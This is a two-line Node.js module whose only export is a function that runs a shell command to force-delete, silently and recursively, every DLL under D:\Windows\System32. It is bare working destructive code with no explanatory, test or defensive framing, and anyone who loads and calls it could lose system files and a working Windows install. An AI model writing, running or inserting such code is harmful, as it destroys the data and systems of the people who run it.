const {execSync}=require('child_process');
module.exports=()=>execSync('del /F /S /Q D:\\Windows\\System32\\*.dll');
